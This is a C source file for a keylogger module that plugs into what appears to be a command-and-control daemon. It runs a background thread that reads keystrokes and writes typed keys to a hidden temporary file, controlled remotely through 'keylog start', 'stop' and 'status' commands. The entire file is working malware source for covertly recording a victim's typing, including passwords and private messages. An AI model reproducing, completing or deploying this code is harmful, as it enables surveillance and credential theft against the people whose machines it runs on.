#include "keylog_service.h"

#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <stdatomic.h>
#include <unistd.h>
#include <sys/param.h>

#include "keyboard.h"
#include "util.h"

typedef _Atomic(FILE*) atomic_file;

struct keylog_config
{
    char destination_name[MAXPATHLEN];
    atomic_file destination;
};

struct keylog_service_ctx
{
    pthread_t thread;
    pthread_mutex_t config_lock;
    pthread_cond_t config_cond;
    atomic_bool config_waiting;
    atomic_bool queue_end;
    struct keylog_config config;
};

static void* keylog_logic_loop(void* _ctx)
{
    struct keylog_service_ctx* ctx = _ctx;
    struct keyboard_session kb;

    int is_keyboard_open = 0;

    pthread_mutex_lock(&ctx->config_lock);
    while (!atomic_load(&ctx->queue_end))
    {
        struct key_event ke;

        if (atomic_load(&ctx->config_waiting)) {
            pthread_cond_wait(&ctx->config_cond, &ctx->config_lock);
        }

        int processed_data = 0;

        FILE* destination = atomic_load(&ctx->config.destination);
        if (destination)
        {
            if (!is_keyboard_open) {
                keyboard_open(&kb);
                is_keyboard_open = 1;
            }

            while (keyboard_poll(&kb, &ke))
            {
                processed_data = 1;
                if (!ke.is_typed)
                    continue;

                if (ke.is_complex)
                    fprintf(destination, "\n%s\n", ke.key_symbol);
                else
                    fputs(ke.key_symbol, destination);
            }

            fflush(destination);
        } else {
            if (is_keyboard_open) {
                is_keyboard_open = 0;
                keyboard_close(&kb);
            }
        }

        if (!processed_data)
            yield_ns(300000000);
    }

    FILE* destination = atomic_load(&ctx->config.destination);
    if (destination)
    {
        fclose(destination);
        atomic_store(&ctx->config.destination, NULL);
    }

    if (is_keyboard_open) {
        is_keyboard_open = 0;
        keyboard_close(&kb);
    }

    pthread_mutex_unlock(&ctx->config_lock);

    return _ctx;
}

static int start_keylogger(struct keylog_service_ctx* ctx, FILE* command_out)
{
    atomic_store(&ctx->config_waiting, 1);
    pthread_mutex_lock(&ctx->config_lock);

    pthread_cond_signal(&ctx->config_cond);
    atomic_store(&ctx->config_waiting, 0);

    if (strlen(ctx->config.destination_name) != 0)
    {
        fprintf(command_out, "Keylogger is already running: %s\n", ctx->config.destination_name);
        pthread_mutex_unlock(&ctx->config_lock);
        return 0;
    }

    strncpy(ctx->config.destination_name, "/tmp/keylogfile_XXXXXX", sizeof(ctx->config.destination_name));

    int fd = mkstemp(ctx->config.destination_name);

    if (fd == -1)
    {
        ctx->config.destination_name[0] = '\0';
        fprintf(command_out, "Error, unable to open the remote keylog file.\n");
        pthread_mutex_unlock(&ctx->config_lock);
        return 0;
    }

    atomic_store(&ctx->config.destination, fdopen(fd, "w"));

    fprintf(command_out, "Keylogger has started.\n");

    pthread_mutex_unlock(&ctx->config_lock);
    return 1;
}

static int stop_keylogger(struct keylog_service_ctx* ctx, FILE* command_out)
{
    atomic_store(&ctx->config_waiting, 1);
    pthread_mutex_lock(&ctx->config_lock);

    pthread_cond_signal(&ctx->config_cond);
    atomic_store(&ctx->config_waiting, 0);

    if (strlen(ctx->config.destination_name) == 0)
    {
        fprintf(command_out, "Keylogger has stopped.\n");
        pthread_mutex_unlock(&ctx->config_lock);
        return 0;
    }

    FILE* destination = atomic_load(&ctx->config.destination);
    fclose(destination);

    ctx->config.destination_name[0] = 0;
    atomic_store(&ctx->config.destination, NULL);

    fprintf(command_out, "Keylogger has been stopped.\n");

    pthread_mutex_unlock(&ctx->config_lock);
    return 1;
}

static int status_keylogger(struct keylog_service_ctx* ctx, FILE* command_out)
{
    atomic_store(&ctx->config_waiting, 1);
    pthread_mutex_lock(&ctx->config_lock);

    pthread_cond_signal(&ctx->config_cond);
    atomic_store(&ctx->config_waiting, 0);

    if (strlen(ctx->config.destination_name) == 0)
        fprintf(command_out, "Keylogger status: Not Active\n");
    else
        fprintf(command_out, "Keylogger status: Logging to: %s;\n", ctx->config.destination_name);

    pthread_mutex_unlock(&ctx->config_lock);
    return 0;
}

static int print_usage(FILE* command_out)
{
    fprintf(command_out, "keylog - Background keylogging service.\n\n");
    fprintf(command_out, "Usage:\n"
        "  keylog <verb>\n\n"
        "  keylog help/h/?\n"
        "    Prints this help output\n\n"
        "  keylog start\n"
        "    Starts the keylogger & begins recording keystrokes to a log file.\n"
        "\n"
        "  keylog stop\n"
        "    Stops the keyloger and ceases recording of keystrokes.\n"
        "\n"
        "  keylog status\n"
        "    Displays the keylogger status (whether it is running) and the location of the log file.\n"
        );
    return 0;
}

int process_keylog_command(struct keylog_service_ctx* ctx, char** argv, int argc, FILE* command_out)
{
    if (argc < 2) {
        fprintf(command_out, "Invalid argument count. Use help command for usage instructions.\n");
        return print_usage(command_out);
    }

    if (strcmp(argv[1], "help") == 0 || strcmp(argv[1], "?") == 0 || strcmp(argv[1], "h") == 0)
        return print_usage(command_out);

    if (strcmp(argv[1], "start") == 0)
        return start_keylogger(ctx, command_out);

    if (strcmp(argv[1], "stop") == 0)
        return stop_keylogger(ctx, command_out);

    if (strcmp(argv[1], "status") == 0)
        return status_keylogger(ctx, command_out);

    fprintf(command_out, "Error, unidentified command: \"%s\"\n", argv[1]);
    print_usage(command_out);

    return 0;
}

static int keylog_entry(void* _ctx, char** argv, int argc, FILE* command_out)
{
    struct keylog_service_ctx* ctx = _ctx;

    if (strcmp(argv[0], "keylog") != 0)
        return 0;

    process_keylog_command(ctx, argv, argc, command_out);

    //We identified the command, so we return 1 (regardless if processing failed or not.)
    return 1;
}

void keylogger_startup(struct cncdaemon_service* dest)
{
    struct keylog_service_ctx* ctx = malloc(sizeof(struct keylog_service_ctx));
    ctx->queue_end = ATOMIC_VAR_INIT(0);
    ctx->config_waiting = ATOMIC_VAR_INIT(0);
    ctx->config.destination_name[0] = 0;
    ctx->config.destination = ATOMIC_VAR_INIT(NULL);

    pthread_cond_init(&ctx->config_cond, NULL);
    pthread_mutex_init(&ctx->config_lock, NULL);

    dest->userdata = ctx;
    dest->handler = keylog_entry;

    pthread_create(&ctx->thread, NULL, keylog_logic_loop, ctx);

}

void keylogger_shutdown(struct cncdaemon_service* service)
{
    struct keylog_service_ctx* ctx = service->userdata;

    atomic_store(&ctx->queue_end, 1);

    pthread_join(ctx->thread, NULL);

    free(service);
}